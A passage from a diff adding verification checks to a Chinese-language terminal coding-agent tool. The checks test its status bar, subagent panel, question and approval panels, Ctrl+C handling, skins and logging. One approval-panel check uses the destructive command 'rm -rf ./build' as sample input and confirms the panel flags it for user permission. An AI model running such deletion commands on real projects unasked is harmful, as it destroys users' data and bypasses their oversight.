+        return _fail("done 后正文丢失")
+    # CJK 表格重排：表头行和数据行的竖线位置必须一致（占宽对齐）
+    lines = [ln for ln in text.split("\n") if ln.startswith("|")]
+    if len(lines) < 4:
+        return _fail(f"表格行数不对：{lines}")
+    pipe_pos = {ln.index("|", 1) for ln in (lines[0], lines[2])}
+    if len(pipe_pos) != 1:
+        return _fail(f"CJK 列没对齐：{lines}")
+    # 表格半行兜底：done 冲掉一切残留
+    r2 = StreamBoxRenderer(print_fn=lambda s: None)
+    r2.on_event({"type": "content", "delta": "半行"})
+    r2.on_event({"type": "done"})
+    if r2._buf != "":
+        return _fail("done 后半行缓冲没清")
+    return _ok("无框直排 + 思考押后 + CJK 表格对齐正常")
+
+
+# ---------------------------------------------------------------------------
+# CLI 骨架（块①：常驻 Application 操作台）
+# ---------------------------------------------------------------------------
+
+def _gbk_safe(s: str) -> str:
+    """把状态栏文案里的 emoji（⚡📂☂ 等 GBK 编不了的）替换成问号——
+    verify 直跑时 stdout 是 GBK 控制台，详情里带 emoji 会炸 print。"""
+    return s.encode("gbk", "replace").decode("gbk")
+
+
+def check_status_bar_tiers():
+    """验证页脚两档宽度（claude code 风格底部条）：该出现的段出现。"""
+    from types import SimpleNamespace as _NS
+    from cli_layout import status_bar_segments
+
+    rt = _NS(
+        agent=_NS(model="test-model"),
+        workspace_cwd="D:/x/codeAgent",
+        bg_count=2,
+        event_pending=["terminal"],
+        turn_active=True,
+    )
+    # 窄屏 <52：只有模型段（⏵⏵ test-model）
+    segs = status_bar_segments(rt, width=40)
+    joined = " · ".join(segs)
+    if "test-model" not in joined or "⏵⏵" not in joined:
+        return _fail(f"窄屏缺模型段: {_gbk_safe(joined)}")
+    if "后台" in joined or "ctrl+t" in joined:
+        return _fail(f"窄屏不该有后台/按键段: {_gbk_safe(joined)}")
+    # 中屏 <76：加后台段，还没有按键说明
+    segs = status_bar_segments(rt, width=60)
+    joined = " · ".join(segs)
+    for frag in ("test-model", "后台"):
+        if frag not in joined:
+            return _fail(f"中屏缺 {frag!r}: {_gbk_safe(joined)}")
+    if "ctrl+t" in joined:
+        return _fail(f"中屏不该有按键说明: {_gbk_safe(joined)}")
+    # 宽屏 >=76：按键说明出现
+    segs = status_bar_segments(rt, width=100)
+    joined = " · ".join(segs)
+    if "ctrl+t" not in joined:
+        return _fail(f"宽屏缺按键说明: {_gbk_safe(joined)}")
+    return _ok("页脚两档宽度内容正确")
+
+
+def check_live_panel():
+    """验证 live 面板：spinner 文案 + 子代理树 + 任务清单 + ctrl+t 开关。"""
+    from types import SimpleNamespace as _NS
+    import cli_live as cl
+    import cli_events as ce
+
+    # spinner：空闲空串；回合中 ✶ 动词… (计时 · ↓ tokens)
+    rt_idle = _NS(turn_active=False)
+    if cl.spinner_text(0, rt_idle, None, 0.0) != "":
+        return _fail("空闲时 spinner 行应为空串")
+    rt_run = _NS(
+        turn_active=True,
+        agent=_NS(_llm_usage_stats={
+            "total_prompt_tokens": 1000, "total_completion_tokens": 500}),
+    )
+    s = cl.spinner_text(3, rt_run, 100.0, 163.0)
+    if "…" not in s or "(1m 3s" not in s or "↓" not in s or "tokens" not in s:
+        return _fail(f"spinner 行长相不对: {s!r}")
+    if cl.fmt_elapsed(45) != "45s" or cl.fmt_elapsed(191) != "3m 11s":
+        return _fail(f"计时格式不对: {cl.fmt_elapsed(45)}/{cl.fmt_elapsed(191)}")
+    if cl.fmt_tokens(17600) != "17.6k":
+        return _fail(f"token 格式不对: {cl.fmt_tokens(17600)}")
+
+    # 批量子代理树：├─/└─ + tool uses + 当前活动
+    cl.agents_begin([("a", "扫描代码"), ("b", "挖上下文")])
+    cl.note_child_tool("a", "read_file(x.py)")
+    cl.note_child_tool("a", "glob(*.py)")
+    cl.note_child_tool("b", "search_files(def foo)")
+    joined = "\n".join(t for _, t in cl.panel_lines(100))
+    if "├─ 扫描代码 · 2 tool uses" not in joined:
+        return _fail(f"批量树缺第一枝: {joined!r}")
+    if "└─ 挖上下文" not in joined or "glob(*.py)" not in joined:
+        return _fail(f"批量树缺末枝/活动: {joined!r}")
+    cl.agent_finish("a", status="done")
+    joined = "\n".join(t for _, t in cl.panel_lines(100))
+    if "├─ 扫描代码 · Done" not in joined:
+        return _fail(f"完成枝长相不对: {joined!r}")
+
+    # 多行描述必须压成单行（面板一行=一行，带 \n 会撕碎布局）；
+    # 行宽超限必须截断（防终端软换行）
+    cl.agents_begin([("k1", "具体任务：\n1. 读 package.json\n2. 摸清构建"),
+                     ("k2", "挖上下文")])
+    rows_nl = cl.panel_lines(100)
+    if any("\n" in t for _, t in rows_nl):
+        return _fail(f"多行描述没压成单行: {rows_nl}")
+    if not any("├─ 具体任务： 1. 读 package.json" in t for _, t in rows_nl):
+        return _fail(f"换行没折叠成空格: {[t for _, t in rows_nl]}")
+    rows_narrow = cl.panel_lines(30)
+    if any(len(t) > 30 for _, t in rows_narrow):
+        return _fail(f"窄屏行没截断: {[t for _, t in rows_narrow]}")
+
+    # 单个子代理形态：⎿ 当前活动 + 计数
+    cl.agents_begin([])
+    cl.agent_begin("solo", "实现 Task 1")
+    cl.note_child_tool("solo", "Update(a.py)")
+    cl.note_child_tool("solo", "Bash(pytest)")
+    joined = "\n".join(t for _, t in cl.panel_lines(100))
+    if "⎿" not in joined or "2 tool uses" not in joined:
+        return _fail(f"单代理形态不对: {joined!r}")
+
+    # 任务清单：□/■/√ + 汇总 + 静态快照块
+    with cl._lock:
+        cl._tasks = [
+            {"subject": "写设计文档", "status": "pending"},
+            {"subject": "探索项目", "status": "in_progress"},
+            {"subject": "澄清问题", "status": "completed"},
+        ]
+    text = "\n".join(t for _, t in cl.tasks_lines(100))
+    for frag in ("□ 写设计文档", "■ 探索项目", "√ 澄清问题"):
+        if frag not in text:
+            return _fail(f"任务清单缺 {frag!r}: {text!r}")
+    if cl.tasks_summary() != "3 tasks (1 done, 1 in progress, 1 open)":
+        return _fail(f"任务汇总不对: {cl.tasks_summary()!r}")
+    static = "\n".join(t for _, t in ce.format_tasks_static_block(100))
+    if "3 tasks (1 done" not in static or "□ 写设计文档" not in static:
+        return _fail(f"静态快照块不对: {static!r}")
+
+    # ctrl+t：藏起来面板空、再按回来
+    cl.toggle_panel()
+    if cl.panel_lines(100) != []:
+        return _fail("ctrl+t 藏面板失效")
+    cl.toggle_panel()
+    if cl.panel_lines(100) == []:
+        return _fail("ctrl+t 恢复面板失效")
+
+    # 收尾清场（不污染其他检查）
+    with cl._lock:
+        cl._tasks = []
+    cl.agents_begin([])
+    return _ok("live 面板（spinner/子代理树/任务清单/开关）正常")
+
+
+def check_assistant_block():
+    """验证 assistant 正文块：● 首行前缀 + 续行缩进 + markdown 渲染。"""
+    import re
+    import cli_events as ce
+    from constants import APP_VERSION
+    if not APP_VERSION:
+        return _fail("APP_VERSION 为空（横幅没版本号可用）")
+    raw = ce.render_assistant_ansi("# 标题\n\n正文段落一", width=80)
+    plain = re.sub(r"\x1b\[[0-9;]*m", "", raw)
+    lines = plain.splitlines()
+    if not lines or not lines[0].startswith("● "):
+        return _fail(f"首行缺 ● 前缀: {plain[:60]!r}")
+    if "标题" not in lines[0]:
+        return _fail(f"markdown 标题没渲染出来: {plain[:80]!r}")
+    if not any(ln.startswith("  ") for ln in lines[1:]):
+        return _fail(f"续行缺两格缩进: {plain!r}")
+    # 技能行 / 提问回显 / 批量子代理行
+    skill = ce.format_skill_lines("brainstorming")
+    if skill[0][1] != "● Skill(brainstorming)" \
+            or "Successfully loaded" not in skill[1][1]:
+        return _fail(f"技能行不对: {skill}")
+    echo = ce.format_ask_user_echo_batch(
+        [{"question": "范围怎么定？", "answers": ["只做核心包"],
+          "multi": False}], width=80)
+    if "用户已回答" not in echo[0][1] or "只做核心包" not in echo[1][1] \
+            or "→" not in echo[1][1]:
+        return _fail(f"批量回显不对: {echo}")
+    # headers 传了用短标题
+    hecho = ce.format_ask_user_echo_batch(
+        [{"question": "范围怎么定？", "answers": ["只做核心包"],
+          "multi": False}], headers=["删除范围"], width=80)
+    if "删除范围" not in hecho[1][1]:
+        return _fail(f"短标题回显不对: {hecho}")
+    cecho = ce.format_ask_user_echo_batch(
+        [{"question": "范围怎么定？", "answers": ["只做核心包"],
+          "multi": False}], chat="我想先聊聊", width=80)
+    if "聊聊" not in cecho[0][1] or "我想先聊聊" not in cecho[1][1] \
+            or "只做核心包" not in cecho[2][1]:
+        return _fail(f"chat 回显不对: {cecho}")
+    # 长问题：CC 同款悬挂缩进——全文不砍字、续行缩进 5 格、答案跟末行
+    longq = "阈值错位修复要不要连 token 估算一起修？" * 6
+    lecho = ce.format_ask_user_echo_batch(
+        [{"question": longq, "answers": ["一起修"], "multi": False}],
+        width=60)
+    lbody = [t for _, t in lecho[1:]]
+    if not any(ln.startswith("     ") for ln in lbody[1:]):
+        return _fail(f"长问题续行缺悬挂缩进: {lbody}")
+    if not (longq[:10] in lbody[0]
+            and lbody[-1].rstrip().endswith("一起修")):
+        return _fail(f"长问题全文/答案位置不对: {lbody}")
+    if "…" in "".join(lbody):
+        return _fail(f"长问题被截断: {lbody}")
+    dep = ce.format_subagent_depart({"tasks": [{}, {}]})
+    if dep != "● Running 2 agents…":
+        return _fail(f"批量头行不对: {dep!r}")
+    done = ce.format_subagent_done(
+        {"tasks": [{"goal": "扫描"}, {"goal": "挖"}]}, 5.0,
+        '{"mode": "batch", "results": ['
+        '{"task_index": 0, "success": true},'
+        '{"task_index": 1, "success": false, "error": "x"}]}')
+    dj = "\n".join(t for _, t in done)
+    if "● 2 agents finished" not in dj or "├─ 扫描" not in dj \
+            or "✗" not in dj:
+        return _fail(f"批量收尾树不对: {dj!r}")
+    return _ok("assistant ●块/技能行/回显/批量子代理行正常")
+
+
+def check_ask_user_tool_layer():
+    """验证 ask_user 工具层 v2：questions 归一化 + 批量/chat/取消协议 + 老格式兼容。"""
+    import json as _json
+    import types
+
+    import tools.ask_user_tool as aut
+
+    captured = {}
+
+    def fake_bridge(qdata):
+        captured.update(qdata)
+        return {"answers": [
+                    {"question": "Q1", "answers": ["A1"], "multi": False},
+                    {"question": "Q2", "answers": ["x", "y"], "multi": True},
+                ],
+                "chat": None, "cancelled": False}
+
+    two = {"questions": [
+        {"question": "Q1", "options": [{"label": "A1"}, {"label": "B1"}]},
+        {"question": "Q2", "options": [{"label": "x"}, {"label": "y"}],
+         "multi": True},
+    ]}
+    out = _json.loads(aut._handle_ask_user(
+        two, agent_ref=types.SimpleNamespace(ask_user_bridge=fake_bridge)))
+    if len(out.get("answers") or []) != 2 or "chat" in out:
+        return _fail(f"批量返回不对: {out}")
+    qs = captured.get("questions") or []
+    if len(qs) != 2 or any(len(q.get("options", [])) < 2 for q in qs):
+        return _fail(f"questions 没归一化透传: {qs}")
+
+    def fake_chat_bridge(qdata):
+        return {"answers": [{"question": "Q1", "answers": ["A1"],
+                             "multi": False}],
+                "chat": "我想先聊聊", "cancelled": False}
+
+    out = _json.loads(aut._handle_ask_user(
+        two, agent_ref=types.SimpleNamespace(ask_user_bridge=fake_chat_bridge)))
+    if out.get("chat") != "我想先聊聊" or len(out.get("answers") or []) != 1:
+        return _fail(f"chat 协议不对: {out}")
+
+    # 老格式桥接返回（裸 list）→ 包成 answers[0] 且带传入的问题文本
+    def fake_list_bridge(qdata):
+        return ["方案A"]
+
+    out = _json.loads(aut._handle_ask_user(
+        two, agent_ref=types.SimpleNamespace(ask_user_bridge=fake_list_bridge)))
+    got = (out.get("answers") or [{}])[0]
+    if got.get("answers") != ["方案A"] or got.get("question") != "Q1":
+        return _fail(f"老格式 list 返回不对: {out}")
+
+    def fake_cancel_bridge(qdata):
+        return {"answers": [], "chat": None, "cancelled": True}
+
+    out = _json.loads(aut._handle_ask_user(
+        two, agent_ref=types.SimpleNamespace(ask_user_bridge=fake_cancel_bridge)))
+    if out.get("error_type") != "user_interrupt":
+        return _fail(f"取消协议不对: {out}")
+
+    # 老单问字段兼容 → 包成 questions[0]
+    out = _json.loads(aut._handle_ask_user(
+        {"question": "单问", "options": [{"label": "A"}, {"label": "B"}]},
+        agent_ref=types.SimpleNamespace(ask_user_bridge=fake_bridge)))
+    qs = captured.get("questions") or []
+    if len(qs) != 1 or qs[0].get("question") != "单问":
+        return _fail(f"老格式没包成 questions: {qs}")
+
+    # 超 4 问 → 报错
+    five = {"questions": [
+        {"question": f"Q{i}", "options": [{"label": "A"}, {"label": "B"}]}
+        for i in range(5)]}
+    out = _json.loads(aut._handle_ask_user(
+        five, agent_ref=types.SimpleNamespace(ask_user_bridge=fake_bridge)))
+    if "error" not in out:
+        return _fail(f"超 4 问该报错: {out}")
+    return _ok("ask_user 工具层 questions/chat/取消协议正常")
+
+
+def check_question_selector():
+    """验证提问面板 v2 纯函数：布局/chips/自填行/Submit/Chat 行/提示栏/降级。"""
+    import cli_question as cq
+
+    # CJK 宽度 + 换行（承 v1）
+    if cq._visual_width("价格页") != 6 or cq._visual_width("ab") != 2:
+        return _fail("CJK 宽度计算不对")
+    lines = cq.wrap_cjk("价格页面就是门面", 8)
+    if len(lines) < 2 or "".join(lines) != "价格页面就是门面" \
+            or any(cq._visual_width(ln) > 8 for ln in lines):
+        return _fail(f"换行不对: {lines}")
+
+    opts = [{"label": "价格页（推荐）",
+             "description": "转化决策点，问题围绕免费额度、版本差异、计费方式，我基于价格页现有内容起草问题清单给你确认"},
+            {"label": "首页底部"}]
+    # 单选：自填行占位、Chat 行在分隔线下、无 Submit
+    text = "".join(t for _, t in cq.render_fragments(
+        "FAQ 常见问题板块加在哪里？", "FAQ 位置", opts, cursor=2,
+        checked=set(), multi=False, width=80))
+    whole = "转化决策点，问题围绕免费额度、版本差异、计费方式，我基于价格页现有内容起草问题清单给你确认"
+    for needle in ("─" * 10, " FAQ 位置", "> 3. Type something.",
+                   "  4. Chat about this", "Enter to select",
+                   "ctrl+g to edit in Notepad"):
+        if needle not in text:
+            return _fail(f"单选布局缺 {needle!r}: {text[:200]!r}")
+    if whole in text:
+        return _fail("长描述没换行")
+    if "✓ Submit" in text:
+        return _fail("单选不该有 Submit 行")
+
+    # 多选：选项勾选框 + Submit 行 + chips 进度行 + header 勾选框
+    mtext = "".join(t for _, t in cq.render_fragments(
+        "你对哪些方面感兴趣？", "兴趣领域", opts, cursor=0, checked={0},
+        multi=True, width=80,
+        chips=[("任务方向", True), ("兴趣领域", False)]))
+    for needle in (" [x] 任务方向  [ ] 兴趣领域", " [x] 兴趣领域",
+                   "> 1. [x] 价格页（推荐）", "  2. [ ] 首页底部",
+                   "  3. [ ] Type something.", "✓ Submit",
+                   "Chat about this", "Enter/Space to toggle"):
+        if needle not in mtext:
+            return _fail(f"多选布局缺 {needle!r}: {mtext[:300]!r}")
+
+    # 自填行有字：多选算勾上、显示文本
+    ctext = "".join(t for _, t in cq.render_fragments(
+        "问", "标题", opts, cursor=2, checked=set(), multi=True,
+        width=80, custom_text="自填的选项"))
+    if "[x] 自填的选项" not in ctext or "Type something" in ctext:
+        return _fail(f"自填行有字该显示 [x] 自填的选项: {ctext[:200]!r}")
+
+    # 提示栏状态：自填聚焦版
+    if "Esc to clear" not in cq.hint_text(True, custom_focused=True):
+        return _fail("自填聚焦提示栏不对")
+
+    # 降级通道：编号输入新返回形状
+    def _canned(*replies):
+        it = iter(replies)
+        return lambda prompt="": next(it)
+
+    fres = cq._fallback_number_input(
+        "问", opts, False, _canned("4", "聊聊再定"))
+    if fres != {"answers": [], "cancelled": False, "chat": True}:
+        return _fail(f"降级 chat 不对: {fres}")
+    fres = cq._fallback_number_input("问", opts, True, _canned("1, 2"))
+    if fres != {"answers": ["价格页（推荐）", "首页底部"],
+                "cancelled": False, "chat": False}:
+        return _fail(f"降级多选不对: {fres}")
+    fres = cq._fallback_number_input("问", opts, False, _canned("自定义文本"))
+    if fres != {"answers": ["自定义文本"], "cancelled": False, "chat": False}:
+        return _fail(f"降级自填不对: {fres}")
+
+    # 记事本兜底：编辑器不存在时返回 None 不抛异常（fail-open）
+    if cq.edit_in_notepad(initial="", editor="不存在的编辑器xyz.exe") is not None:
+        return _fail("记事本起不来该返回 None")
+    return _ok("提问面板 v2 布局/自填/Submit/chips/降级正常")
+
+
+def check_approval_panel():
+    """验证审批面板：命令/路径全文画进面板、超长截断、折行不超宽、退出自擦。
+
+    背景：审批面板曾把 ⚠️ 警告和命令 print 在面板外（冻进滚动历史），
+    面板本身退出也不擦——审批完上下文里残留整块审批 UI。规矩改为：
+    警告 + 命令全文进面板问题文本，面板选完整体自擦，
+    上下文里只留 ● Bash(...) 工具行。
+    """
+    import inspect
+
+    import cli as _cli
+    import cli_question as cq
+
+    # 命令审批：⚠️ 警告 + 命令全文 + 收尾提问都在面板问题文本里
+    q = _cli._approval_panel_question("rm -rf ./build", width=80)
+    for needle in ("⚠️ 即将执行破坏性命令：", "rm -rf ./build",
+                   "允许执行以上命令吗？"):
+        if needle not in q:
+            return _fail(f"命令审批问题缺 {needle!r}: {q!r}")
+
+    # 超长命令截断到 200 字符（整串截断：echo 前缀占 5，正文剩 195 个 a）
+    q2 = _cli._approval_panel_question("echo " + "a" * 300, width=80)
+    if q2.count("a") != 195 or "已截断" not in q2:
+        return _fail("超长命令没截断到 200 字符")
+    for ln in q2.splitlines():
+        if cq._visual_width(ln) > 80:
+            return _fail(f"面板行超宽({cq._visual_width(ln)}): {ln[:60]!r}")
+
+    # 路径审批：措辞不同（写入路径），带收尾提问
+    q3 = _cli._approval_panel_question("D:\\project\\demo\\新文件.txt",
+                                       width=80)
+    for needle in ("⚠️ 即将写入路径(白名单外)：", "D:\\project\\demo\\新文件.txt",
+                   "允许写入以上路径吗？"):
+        if needle not in q3:
+            return _fail(f"路径审批问题缺 {needle!r}: {q3!r}")
+
+    # 整幅面板渲染：完整命令 + 三选 + 标题都看得到
+    opts = [{"label": "允许（本次）", "description": "仅这一次"},
+            {"label": "总是允许并记住", "description": "路径→父目录进白名单"},
+            {"label": "拒绝", "description": "不执行"}]
+    text = "".join(t for _, t in cq.render_fragments(
+        q, "命令审批", opts, cursor=0, checked=set(), multi=False,
+        width=80))
+    for needle in ("rm -rf ./build", " 命令审批", "1. 允许（本次）",
+                   "3. 拒绝"):
+        if needle not in text:
+            return _fail(f"审批面板缺 {needle!r}: {text[:200]!r}")
+
+    # 退出自擦：选完面板整体消失，不冻进滚动历史
+    if "erase_when_done=True" not in inspect.getsource(cq.run_selector):
+        return _fail("run_selector 没开 erase_when_done（选完面板残留）")
+    return _ok("审批面板文本/截断/折行/自擦正常")
+
+
+def check_panel_ctrlc():
+    """验证面板 Ctrl+C 双通道：信号取消钩子 + 中断联动接线。
+
+    背景（实测根因）：mintty+winpty 下 ^C 常不走按键记录而是控制台
+    事件（OS 信号）——面板键位收不到，用户连按多记毫无反应；取消后
+    模型还会拿着"审批被拒"继续跑。修复：面板注册信号取消钩子
+    （cancel_active_panel），SIGINT 处理器/审批回调按 interrupt 语义
+    联动中断整轮。
+    """
+    import inspect
+
+    import cli as _cli
+    import cli_question as cq
+
+    # 1) 没面板时：cancel_active_panel 返回 False（信号走原逻辑）
+    with cq._active_panel_lock:
+        saved, cq._active_panel = cq._active_panel, None
+    try:
+        if cq.cancel_active_panel() is not False:
+            return _fail("无面板时 cancel_active_panel 应返回 False")
+        # 2) 有假面板：钩子被调、返回 True（try/finally 复位防污染）
+        fired = []
+        with cq._active_panel_lock:
+            cq._active_panel = {"cancel": lambda: fired.append(1)}
+        if cq.cancel_active_panel() is not True or fired != [1]:
+            return _fail("有面板时钩子没被调/返回值不对")
+    finally:
+        with cq._active_panel_lock:
+            cq._active_panel = saved
+
+    # 3) 中断联动函数：None/无实现安全空过；有实现则被调
+    if _cli._fire_turn_interrupt(None) is not None:
+        return _fail("无 provider 的 _fire_turn_interrupt 应安全空过")
+    called = []
+    _cli._fire_turn_interrupt(lambda: (lambda: called.append(1)))
+    if called != [1]:
+        return _fail("有 provider 的 _fire_turn_interrupt 没调中断函数")
+
+    # 4) 接线完整性：键位 interrupt 语义 / 余量清理 / 信号优先分支
+    src_sel = inspect.getsource(cq.run_selector)
+    if "interrupt=True" not in src_sel:
+        return _fail("run_selector 的 c-c 键位没带 interrupt 语义")
+    if "_drain_pending_ctrl_c()" not in src_sel:
+        return _fail("run_selector 退出后没清 Ctrl+C 余量")
+    src_cli = inspect.getsource(_cli)
+    for needle in ("cancel_active_panel()", "_fire_turn_interrupt",
+                   "turn_interrupt_provider"):
+        if needle not in src_cli:
+            return _fail(f"cli.py 缺接线 {needle!r}")
+    src_handler = inspect.getsource(_cli)
+    if "cli_question" not in src_handler.split("_os_sigint_handler")[1][:800]:
+        return _fail("_os_sigint_handler 没有面板优先分支")
+    return _ok("面板 Ctrl+C 信号钩子/中断联动/接线正常")
+
+
+def check_enter_routing():
+    """验证提交小函数：入队成功、输入框清空、空输入不入队。"""
+    import queue as _q
+    from prompt_toolkit.buffer import Buffer
+    from prompt_toolkit.history import InMemoryHistory
+    from cli_layout import submit_input
+
+    buf = Buffer(history=InMemoryHistory())
+    buf.text = "hello /world"
+    q = _q.Queue()
+    submit_input(buf, q)
+    if q.empty() or q.get_nowait() != "hello /world":
+        return _fail("提交后队列里没有原文")
+    if buf.text != "":
+        return _fail(f"提交后输入框没清空: {buf.text!r}")
+    # 空白输入不入队（老语义：空行直接 continue，不烧一轮）
+    buf.text = "   "
+    submit_input(buf, q)
+    if not q.empty():
+        return _fail("空白输入不该入队")
+    return _ok("提交路由正确")
+
+
+def check_cli_layout():
+    """验证能构建出 Application（无头模式）+ 退出请求不炸。"""
+    import os
+    from types import SimpleNamespace as _NS
+    from cli_layout import build_application, request_app_exit
+
+    rt = _NS(
+        agent=_NS(model="test-model"), workspace_cwd="D:/x",
+        bg_count=0, event_pending=[], turn_active=False,
+    )
+    # 无头开关：verify 在管道里跑，拿不到真终端输出；不开这个开关
+    # build_application 会（正确地）返回 None 走降级
+    os.environ["CODEAGENT_LAYOUT_HEADLESS"] = "1"
+    try:
+        app = build_application(rt, input_queue=None, eof_sentinel=None)
+    finally:
+        os.environ.pop("CODEAGENT_LAYOUT_HEADLESS", None)
+    if app is None:
+        return _fail("build_application 返回 None")
+    if app.full_screen:
+        return _fail("必须是非全屏模式（full_screen=False）")
+    # 补全候选区必须是内联区块（不能是 FloatContainer 浮层——用户
+    # 反馈悬浮窗观感差，2026-09-10 起改为布局内的普通区块）
+    from prompt_toolkit.layout import FloatContainer
+    from prompt_toolkit.layout.containers import ConditionalContainer
+    if isinstance(app.layout.container, FloatContainer):
+        return _fail("布局还在用 FloatContainer 浮层（补全应为内联区块）")
+    area = getattr(app, "_codeagent_completions_area", None)
+    if area is None or not isinstance(area, ConditionalContainer):
+        return _fail("内联补全候选区缺失（app._codeagent_completions_area）")
+    request_app_exit(app)   # app 没在跑也不许炸（内部全吞）
+    return _ok("Application 构建 + 内联补全候选区 + 安全退出请求正常")
+
+
+def check_skin_engine():
+    """验证皮肤引擎：四套内置、YAML overlay、热切换、样式覆盖。"""
+    import tempfile
+    from pathlib import Path
+    import cli_skin
+
+    skins = cli_skin.list_skins()
+    names = {s["name"] for s in skins}
+    for expect in ("default", "mono", "slate", "daylight"):
+        if expect not in names:
+            return _fail(f"内置皮肤缺 {expect}: {sorted(names)}")
+
+    # YAML overlay：只覆盖一节，其余继承 default
+    with tempfile.TemporaryDirectory() as td:
+        skin_dir = cli_skin._skins_dir()
+        fake = Path(td) / "verify_skin.yaml"
+        fake.write_text(
+            "name: verify_skin\ndescription: 临时验证\n"
+            "colors:\n  prompt: \"#123456\"\nbranding:\n  prompt_symbol: \"»\"\n",
+            encoding="utf-8",
+        )
+        # 借用户皮肤目录放一下（放不进去就跳过 overlay 段，保底不挂）
+        overlay_tested = False
+        try:
+            skin_dir.mkdir(parents=True, exist_ok=True)
+            target = skin_dir / "_verify_skin.yaml"
+            target.write_text(fake.read_text(encoding="utf-8"), encoding="utf-8")
+            try:
+                skin = cli_skin.load_skin("verify_skin")
+                overlay_tested = (
+                    skin.get_color("prompt") == "#123456"
+                    and skin.get_branding("prompt_symbol") == "»"
+                    # 未覆盖的键继承 default
+                    and skin.tool_prefix == "┊"
+                )
+            finally:
+                target.unlink(missing_ok=True)
+        except Exception:
+            pass
+        if not overlay_tested:
+            return _fail("YAML overlay 覆盖/继承不对")
+
+    # 热切换 + 样式覆盖
+    old = cli_skin.get_active_skin_name()
+    try:
+        cli_skin.set_active_skin("mono")
+        mono_style = cli_skin.get_pt_style_overrides()
+        if "prompt" in mono_style:
+            return _fail("mono 不该有 prompt 颜色覆盖")
+        cli_skin.set_active_skin("default")
+        if not cli_skin.get_pt_style_overrides().get("prompt", "").startswith("fg:#00aa88"):
+            return _fail("default 的 prompt 颜色覆盖丢失")
+        if cli_skin.hex_to_truecolor_ansi("#FFD700") != "\033[38;2;255;215;0m":
+            return _fail("真彩 ANSI 换算错误")
+        if cli_skin.hex_to_truecolor_ansi("") != "":
+            return _fail("空颜色必须返回空 ANSI")
+    finally:
+        cli_skin.set_active_skin(old)
+    return _ok("四套内置 + overlay + 热切换正常")
+
+
+def check_pt_extras():
+    """验证键盘协议别名：安装器生效、ANSI_SEQUENCES 表真的改了。"""
+    import cli_pt_extras
+    from prompt_toolkit.input.ansi_escape_sequences import ANSI_SEQUENCES
+    from prompt_toolkit.keys import Keys
+
+    n = cli_pt_extras.install_all()
+    if n < 0:
+        return _fail("安装器返回了负数")
+    alt_enter = (Keys.Escape, Keys.ControlM)
+    for seq in ("\x1b[13;2u", "\x1b[27;2;13~", "\x1b[13;5u", "\x1b[27;5;13~"):
+        if ANSI_SEQUENCES.get(seq) != alt_enter:
+            return _fail(f"{seq!r} 没映射到 Alt+Enter")
+    for seq in ("\x1b[I", "\x1b[O"):
+        if ANSI_SEQUENCES.get(seq) != Keys.Ignore:
+            return _fail(f"{seq!r} 没映射到 Ignore")
+    return _ok("Shift/Ctrl+Enter 别名 + 焦点噪声忽略生效")
+
+
+def check_console_bridge():
+    """验证共享 Console 两座桥：print 走 pt 通道、input 桥跨线程回传。"""
+    import threading as _th
+    import cli_ui
+
+    # print 桥：rich 渲染产物（含 ANSI 色码）进 emit_ansi，不直写 stdout
+    got = []
+    orig = cli_ui.emit_ansi
+    cli_ui.emit_ansi = got.append
+    try:
+        cli_ui.console.print("[red]你好[/red]")
+    finally:
+        cli_ui.emit_ansi = orig
+    if len(got) != 1 or "\x1b[" not in got[0] or "你好" not in got[0]:
+        return _fail(f"print 桥产物异常：{got!r}")
+
+    # input 桥：工作线程的提问经桥执行并回传（假桥不真读 stdin）
+    result = {}
+    cli_ui.set_input_bridge(lambda f: "answered")
+    try:
+        t = _th.Thread(
+            target=lambda: result.setdefault("v", cli_ui.console.input("问：")),
+            daemon=True,
+        )
+        t.start()
+        t.join(timeout=5)
+    finally:
+        cli_ui.set_input_bridge(None)
+    if result.get("v") != "answered":
+        return _fail(f"input 桥回传异常：{result}")
+
+    # 终端让渡协程：真挂起→跑 fn→恢复（假 app 走完整个生命周期）
+    import asyncio as _aio2
+    import inspect as _insp
+
+    class _CM:
+        def __init__(self, log, tag):
+            self._log, self._tag = log, tag
+
+        def __enter__(self):
+            self._log.append(f"enter:{self._tag}")
+            return self
+
+        def __exit__(self, *a):
+            self._log.append(f"exit:{self._tag}")
+            return False
+
+    log = []
+    fake_app = SimpleNamespace(
+        _is_running=True,
+        input=SimpleNamespace(
+            detach=lambda: _CM(log, "detach"),
+            cooked_mode=lambda: _CM(log, "cooked"),
+        ),
+        renderer=SimpleNamespace(
+            erase=lambda: log.append("erase"),
+            reset=lambda: log.append("reset"),
+        ),
+        _redraw=lambda: log.append("redraw"),
+        _request_absolute_cursor_position=lambda: None,
+        output=SimpleNamespace(responds_to_cpr=False),
+    )
+    got = _aio2.run(cli_ui.terminal_handover(fake_app, lambda: "ok"))
+    if got != "ok":
+        return _fail(f"让渡协程没跑 fn / 没回传: {got!r}")
+    # 挂起顺序：先脱离 raw 再擦屏；恢复顺序：先退上下文再重绘
+    for step in ("enter:detach", "enter:cooked", "erase",
+                 "exit:cooked", "exit:detach", "reset", "redraw"):
+        if step not in log:
+            return _fail(f"让渡生命周期缺步骤 {step!r}: {log}")
+    # app 不在跑 → 原地执行不碰界面
+    idle = SimpleNamespace(_is_running=False)
+    if _aio2.run(cli_ui.terminal_handover(idle, lambda: 42)) != 42:
+        return _fail("idle app 原地执行失败")
+    # 回归栏栅：pt 3.0.53 没有的方法名再进源码 = 桥又要塌
+    import cli_layout as _cl
+    for mod in (cli_ui, _cl):
+        if "run_in_terminal_async" in _insp.getsource(mod):
+            return _fail(f"{mod.__name__} 又引用了不存在的 run_in_terminal_async")
+    return _ok("print 桥 + input 桥 + 终端让渡生命周期正常")
+
+
+def check_logging_setup(tmp):
+    """验证运行日志装配：文件落盘 INFO+、控制台 WARNING 保底、幂等。"""
+    import logging as _lg
+    from agent.log_setup import setup_logging, reset_logging
+
+    reset_logging()   # 干净起点（幂等标记 + root handlers 清空）
+    log_dir = Path(tmp) / "logs"
+    path = setup_logging(log_dir)
+    if not path.exists():
+        return _fail(f"日志文件没建: {path}")
+    # 幂等：再来一次返回同一路径、不重复挂 handler
+    n_handlers = len(_lg.getLogger().handlers)
+    if setup_logging(log_dir) != path or len(_lg.getLogger().handlers) != n_handlers:
+        return _fail("setup_logging 不幂等（重复挂 handler）")
+    # INFO 落文件、WARNING 也落文件
+    _lg.getLogger("verify.log.probe").info("info-应该落盘")
+    _lg.getLogger("verify.log.probe").warning("warn-应该落盘")
+    for h in _lg.getLogger().handlers:
+        h.flush()
+    text = path.read_text(encoding="utf-8")
+    if "info-应该落盘" not in text or "warn-应该落盘" not in text:
+        return _fail(f"INFO/WARNING 没进日志文件: {text[-200:]!r}")
